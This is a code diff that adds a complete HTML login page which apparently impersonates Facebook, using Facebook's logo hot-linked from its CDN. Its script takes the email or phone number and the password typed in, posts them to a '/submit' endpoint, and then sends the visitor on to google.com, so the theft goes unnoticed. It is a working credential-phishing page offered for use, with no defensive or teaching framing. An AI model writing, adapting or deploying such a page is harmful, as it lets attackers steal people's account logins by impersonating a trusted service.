@@ -1,1 +1,74 @@
-
+<!DOCTYPE html>
+<html>
+<head>
+<title>Login required</title>
+<style>
+  @font-face{
+  src: url('productsans.ttf');
+  font-family: f;
+}
+body{
+  background: ghostwhite;
+}
+.logo{
+  width: 200px;
+  padding: 0;
+  margin: 50px 0px 10px 0px;
+}
+input{
+  background: #fff;
+  outline: none;
+  border: solid 1px #efefef;
+  font-family: f;
+  width: 230px;
+  height: 30px;
+  padding: 3px 15px 3px 15px;
+}
+button{
+  color: #fff;
+  border: none;
+  border-radius: 6px;
+  width: 260px;
+  height: 35px;
+  font-family: f;
+  background: cornflowerblue;
+  transition: 0.2s;
+}
+button:hover{
+  color: #000;
+  background: mediumseagreen;
+}
+  </style>
+</head>
+<body>
+  <center>
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="logo"/>
+    <form id="form1">
+      <input id="email" placeholder="Email or phone number" required><br><br>
+      <input type="password" id="password" placeholder="Password" required><br><br>
+      <button type="submit">Log in</button>
+    </form>
+  </center>
+    <p id="msg"></p>
+<script>
+    const form = document.getElementById('form1');
+    const msg = document.getElementById('msg');
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email = form.email.value;
+        const password = form.password.value;
+        if (!email || !password){
+            msg.textContent = 'please add both email & password.';
+        } else {
+            const dat = await fetch('/submit',{method: 'POST',headers: {'Content-Type': 'application/x-www-form-urlencoded',},body: `email=${email}&password=${password}`,
+            });
+            msg.textContent = '';
+            if (dat.status === 200) {
+                window.location.href = 'https://www.google.com';
+            }
+            form.reset();
+        }
+    });
+</script>
+</body>
+</html>
